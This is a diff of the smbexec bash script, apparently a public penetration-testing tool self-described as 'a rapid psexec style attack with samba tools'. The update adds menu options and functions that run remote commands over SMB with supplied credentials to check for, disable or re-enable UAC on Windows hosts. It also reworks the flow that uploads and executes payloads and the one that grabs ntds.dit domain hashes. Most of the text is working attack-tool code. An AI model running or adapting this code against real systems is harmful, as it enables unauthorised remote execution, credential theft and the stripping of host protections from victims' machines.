@@ -22,8 +22,10 @@
 #You should have received a copy of the GNU General Public License
 #along with this program.  If not, see <http://www.gnu.org/licenses/>.e
 #
-# Last update - 01/24/2013 v1.2.3
 #############################################################################################
+
+version="1.2.4"
+codename="Mommy's Little Monster"
 
 # Check to see if X is running
 if [ -z $(pidof X) ] && [ -z $(pidof Xorg) ]; then
@@ -43,7 +45,7 @@ trap f_ragequit 2
 # Find the files and set the path values based on machine architecture
 smbexecpath=$(locate -l 1 smbexeclient | sed 's,/*[^/]\+/*$,,')
 
-if [ ! -e $smbexecpath/smbexeclient ]; then
+if [ ! -e $smbexecpath/smbexeclient ] || [ ! -e $smbexecpath/smbwinexe ]; then
 	echo -e "\n\e[1;31m[!] You have to compile the executables first.\e[0m\n\e[1;33m[*] Please run the installer and select option #1.\e[0m\n" 1>&2
 	exit 1
 fi
@@ -83,7 +85,8 @@ fi
 if [[ -z $(ls $logfldr) ]];then rm -rf $logfldr; fi
 rm -rf /tmp/smbexec/
 clear
-exit
+f_freshstart
+f_mainmenu
 
 }
 
@@ -292,10 +295,10 @@ f_vanish(){
 f_banner(){
 	clear
 	echo "************************************************************"
-	echo -e "		      \e[1;36msmbexec - v1.2.3\e[0m       "
+	echo -e "		      \e[1;36msmbexec - v$version\e[0m       "
 	echo "	A rapid psexec style attack with samba tools              "
 	echo "      Original Concept and Script by Brav0Hax & Purehate    "
-	echo "              Codename - Mommy's Little Monster	          "
+	echo "              Codename - $codename	          "
 	echo -e "             Gonna pha-q up - \e[1;35mPurpleTeam\e[0m \e[1;37mSmash!\e[0m"
 	echo "************************************************************"
 	echo
@@ -434,7 +437,89 @@ check_for_da=1
 f_smb_login
 }
 
+f_uac_setup(){
+f_banner	
+p=
+if [[ -e "$logfldr/host.lst.$(echo $range | cut -d"/" -f1)" ]]; then p="[$logfldr/host.lst.$(echo $range | cut -d"/" -f1)]"; fi
+read -e -p " Target IP or host list $p: " tf
+if [ -z $tf ]; then tf="$logfldr/host.lst.$(echo $range | cut -d"/" -f1)"; fi
 
+if [[ $tf =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+	    echo $tf > /tmp/smbexec/rhost.txt
+	    RHOSTS=/tmp/smbexec/rhost.txt
+    elif [[ -e $tf ]]; then 
+	    RHOSTS=$tf
+    else
+	    echo -en "   Invalid IP or file does not exist.\n"
+	    sleep 3
+	    f_uac_sys_check
+    fi
+
+f_smbauth
+
+if [ "$sysenumchoice" == "5" ];then
+	f_uac_check
+	if [ -e /tmp/smbexec/uac_enabled.lst.tmp ];then
+		mv /tmp/smbexec/uac_enabled.lst.tmp $logfldr/uac_enabled.lst
+	fi
+elif [ "$sysexpchoice" == "4" ]; then
+	f_disable_uac
+elif [ "$sysexpchoice" == "5" ]; then
+	f_enable_uac
+fi
+
+f_freshstart
+f_mainmenu
+
+}
+
+f_uac_check(){
+for i in $(cat "$RHOSTS"); do
+	# Check to see if UAC is enabled on the system
+	$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA" &> /tmp/smbexec/uac.check.tmp
+	uac_enabled=$(cat /tmp/smbexec/uac.check.tmp | grep -o "0x1")
+	if [ ! -z "$uac_enabled" ]; then
+		echo -e "\n\e[1;33m[*] UAC is enabled on $i\e[0m"
+		sleep 1
+		echo $i >> /tmp/smbexec/uac_enabled.lst.tmp
+	else
+		echo -e "\n\e[1;33m[*] UAC does not appear to be enabled on $i\e[0m"
+		sleep 1
+	fi
+done
+
+}
+
+
+f_disable_uac(){
+for i in $(cat "$RHOSTS"); do
+	$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f" &> /tmp/smbexec/uac_disable.tmp
+	disable_success=$(cat /tmp/smbexec/uac_disable.tmp | grep -o "successfully")
+	if [ ! -z $disable_success ]; then
+		echo -e "\n\e[1;32m[+] UAC has been disabled on $i.\e[0m"
+		sleep 1
+	else
+		echo -e "\n\e[1;31m[-] Could not disable UAC on $i.\e[0m"
+		sleep 1
+	fi
+done
+}
+
+f_enable_uac(){
+for i in $(cat "$RHOSTS"); do
+	$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f" &> /tmp/smbexec/uac_enable.tmp
+	enable_success=$(cat /tmp/smbexec/uac_enable.tmp | grep -o "successfully")
+
+	if [ ! -z $enable_success ]; then
+		echo -e "\n\e[1;32m[+] UAC has been enabled on $i.\e[0m"
+		sleep 1
+	else
+		echo -e "\n\e[1;31m[-] Could not enable UAC on $i.\e[0m"
+		sleep 1
+	fi
+done
+
+}
 
 #Function to grab local hashes and domain cached creds
 f_hashgrab(){
@@ -468,21 +553,7 @@ for i in $(cat $RHOSTS); do
 
 	# Check to see what type of error we got so we can tell the user
 	f_smbauthinfo
-
-	if [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
-		echo -e "\n\e[1;32m[+] Authentication to $i successful...\e[0m"
-	elif [ -s /tmp/smbexec/success.chk ] && [ ! -z "$badshare" ]; then
-		echo -e "\n\e[1;33m[*] Authentication to $i was successful, but the share doesn't exist\e[0m"
-	elif [ ! -z "$logonfail" ]; then
-		echo -e "\n\e[1;31m[-] Authentication to $i failed\e[0m"
-	elif [ ! -z "$connrefused" ]; then
-		echo -e "\n\e[1;31m[-] Connection to $i was refused\e[0m"
-	elif [ ! -z "$unreachable" ]; then
-		echo -e "\n\e[1;31m[-] There is no host assigned to IP address $i \e[0m"
-	else
-		echo -e "\n\e[1;33m[*] I'm not sure what happened, supplying output...\e[0m"
-		cat /tmp/smbexec/connects.tmp | egrep -i '(error|failed:)'
-	fi
+	f_smbauthresponse
 
 	# Get successful IP addy for cleanup later
 	ConnCheck=$(cat /tmp/smbexec/connects.tmp | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u)
@@ -545,7 +616,7 @@ fi
 
 f_banner
 f_smbauth
-f_finddcs
+#f_finddcs
 
 tf=
 while [ -z $tf ]; do
@@ -584,8 +655,8 @@ ntdssuccess=$(cat /tmp/smbexec/ntds.chk|grep -o Success)
 
 if [ -z $ntdssuccess ]; then
 	echo -e "\e[1;31m[-] The ntds.dit file does not exist in the path provided.\e[0m\n"
-	sleep 5
-	f_ntdspath
+	sleep 3
+	f_dchashgrab
 else
 	echo -e "\t\e[1;32m[+] The ntds.dit file was found in the path provided...\e[0m\n"
 	sleep 3
@@ -873,22 +944,17 @@ f_smbauth(){
 	fi
 
 	# If a domain account is being used, ask for the domain name if not included in SMBUser
-	if [ "$sysexpchoice" == "2" ]; then 
-		if [[ -n $(echo $SMBUser | awk -F\\ '{printf("%s", $2)}') ]]; then
-			SMBDomain=$(echo $SMBUser | awk -F\\ '{print $1}')
-			SMBUser=$(echo $SMBUser | awk -F\\ '{print $2}')
-		else
-			while [ -z $SMBDomain ]; do read -e -p " Please provide the Domain for the user account specified : " SMBDomain; done
-		fi
-	elif [ "$sysenumchoice" == "2" ]; then # Check for domain for host share list option
-		read -e -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
-		if [ -z $SMBDomain ]; then SMBDomain=.;	fi
-	elif [ "$mainchoice" == "3" ]; then # Check for domain for host share list option
-		read -e -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
-		if [ -z $SMBDomain ]; then SMBDomain=.;	fi
+#	if [ "$sysexpchoice" == "2" ] || [ "$sysenumchoice" == "2" ] || [ "$mainchoice" == "3" ] || [ "$sysenumchoice" == "5" ] ; then 
+	if [[ -n $(echo $SMBUser | awk -F\\ '{printf("%s", $2)}') ]]; then
+		SMBDomain=$(echo $SMBUser | awk -F\\ '{print $1}')
+		SMBUser=$(echo $SMBUser | awk -F\\ '{print $2}')
 	else
-		SMBDomain=. #equivalent to localhost, thx Mubix!
+		read -e -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
+		if [ -z $SMBDomain ]; then SMBDomain=.;	fi #equivalent to localhost, thx Mubix!
 	fi
+#	else
+#		SMBDomain=. 
+#	fi
 
 	echo "username=$SMBUser" > /tmp/smbexec/smbexec.auth
 	echo "password=$SMBPass" >> /tmp/smbexec/smbexec.auth
@@ -902,6 +968,27 @@ f_smbauthinfo(){
 	badshare=$(cat /tmp/smbexec/connects.tmp | egrep -i 'NT_STATUS_BAD_NETWORK_NAME|NT_STATUS_OBJECT_PATH_NOT_FOUND')
 	unreachable=$(cat /tmp/smbexec/connects.tmp | grep -i "NT_STATUS_HOST_UNREACHABLE")
 	accessdenied=$(cat /tmp/smbexec/connects.tmp | grep -i "NT_STATUS_ACCESS_DENIED")
+}
+
+f_smbauthresponse(){
+		if [ -s /tmp/smbexec/success.chk ] && [ ! -z "$badshare" ]; then
+			echo -e "\e[1;33m[*] Authentication to $i was successful, but the share doesn't exist\e[0m"
+		elif [ ! -z "$logonfail" ]; then
+			echo -e "\e[1;31m[-] Authentication to $i failed\e[0m"
+		elif [ ! -z "$accessdenied" ]; then
+			echo -e "\e[1;31m[-] Remote access to $i is denied\e[0m"
+		elif [ ! -z "$connrefused" ]; then
+			echo -e "\e[1;31m[-] Connection to $i was refused\e[0m"
+		elif [ ! -z "$unreachable" ]; then
+			echo -e "\e[1;31m[-] There is no host assigned to IP address $i \e[0m"
+		elif [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
+			echo -e "\e[1;32m[+] Authentication to $i successful...\e[0m"
+			uploadpayload=1
+		else
+			echo -e "\e[1;33m[*] I'm not sure what happened, supplying output...\e[0m"
+			cat /tmp/smbexec/connects.tmp | egrep -i 'error|fail'
+		fi	
+
 }
 
 #Function to gain the basic info
@@ -969,6 +1056,7 @@ f_sd(){
 xdg-open http://www.youtube.com/watch?v=D7sUh-DX7I0 >& /tmp/mlmjunk
 f_mainmenu
 }
+
 # The name says it all...get your popcorn ready...
 f_getsome(){
 	cat /dev/urandom| tr -dc '0-9a-zA-Z'|head -c 8 > /tmp/smbexec/filename.rnd #create a random filename
@@ -986,24 +1074,12 @@ f_getsome(){
 
 		# Check to see what type of error we got so we can tell the user
 		f_smbauthinfo
-
-		if [ -s /tmp/smbexec/success.chk ] && [ ! -z "$badshare" ]; then
-			echo -e "\e[1;33m[*] Authentication to $i was successful, but the share doesn't exist\e[0m"
-		elif [ ! -z "$logonfail" ]; then
-			echo -e "\e[1;31m[-] Authentication to $i failed\e[0m"
-		elif [ ! -z "$accessdenied" ]; then
-			echo -e "\e[1;31m[-] Remote access to $i is denied\e[0m"
-		elif [ ! -z "$connrefused" ]; then
-			echo -e "\e[1;31m[-] Connection to $i was refused\e[0m"
-		elif [ ! -z "$unreachable" ]; then
-			echo -e "\e[1;31m[-] There is no host assigned to IP address $i \e[0m"
-		elif [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
-			echo -e "\e[1;32m[+] Authentication to $i successful...uploading and executing payload\e[0m"
-		else
-			echo -e "\e[1;33m[*] I'm not sure what happened, supplying output...\e[0m"
-			cat /tmp/smbexec/connects.tmp | egrep -i 'error|fail'
+		f_smbauthresponse
+		
+		if [ "$uploadpayload" == 1 ];then
+			echo -e "\t\e[1;32m[+] Uploading and attempting to execute payload...\e[0m"
 		fi
-
+		
 		# Get successful IP addy for cleanup later
 		ConnCheck=$(cat /tmp/smbexec/connects.tmp | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u) 
 
@@ -1111,7 +1187,7 @@ f_freshstart(){
 rm -rf /tmp/smbexec/ # cleanup all the stuff we put in the temp dir
 
 # unset variables to prevent problems in the loop
-vars="badshare cemptyrpath ConnCheck connrefused enumber i isadmin lhost listener logonfail LPATH machine mainchoice oddshare onelettershare p paychoice payload port rcpath RHOSTS RPATH seed SHARERHOSTS SMBDomain SMBFilename SMBHASH SMBPass SMBUser superoddshare tf unreachable datatable linktable check_for_da"
+vars="badshare cemptyrpath ConnCheck connrefused enumber i isadmin lhost listener logonfail LPATH machine mainchoice oddshare onelettershare p paychoice payload port rcpath RHOSTS RPATH seed SHARERHOSTS SMBDomain SMBFilename SMBHASH SMBPass SMBUser superoddshare tf unreachable datatable linktable check_for_da sysenumchoice sysexpchoice"
 
 for var in $vars; do
 	unset $var
@@ -1127,7 +1203,8 @@ f_system_enumeration_menu(){
 	echo "2. Enumerate Shares"
 	echo "3. Remote login validation"
 	echo "4. Check systems for Domain Admin"
-	echo "5. Main menu"
+	echo "5. Check systems for UAC"
+	echo "6. Main menu"
 
 	read -p "Choice : " sysenumchoice
 
@@ -1136,7 +1213,8 @@ f_system_enumeration_menu(){
 		2) f_enumshares ;;
 		3) f_smb_login ;;
 		4) f_da_sys_check ;;
-		5) f_mainmenu ;;
+		5) f_uac_setup ;;
+		6) f_mainmenu ;;
 		*) f_system_enumeration_menu ;;
 	esac
 
@@ -1147,18 +1225,20 @@ f_system_exploitation_menu(){
 	f_banner
 	
 	echo -e "\e[1;37mSystem Exploitation Menu\e[0m"
-	echo "1. Local System Account"
-	echo "2. Domain Account"
-	echo "3. Create an executable and rc script"
-	echo "4. Main Menu"
+	echo "1. Remote system access"
+	echo "2. Create an executable and rc script"
+	echo "3. Disable UAC"
+	echo "4. Enable UAC"
+	echo "5. Main Menu"
 
 	read -p "Choice : " sysexpchoice
 
 	case "$sysexpchoice" in
 		1) f_vanish ;;
 		2) f_vanish ;;
-		3) f_vanish ;;
-		4) f_mainmenu ;;
+		3) f_uac_setup ;;
+		4) f_uac_setup ;;
+		5) f_mainmenu ;;
 		*) f_system_exploitation_menu ;;
 	esac
 
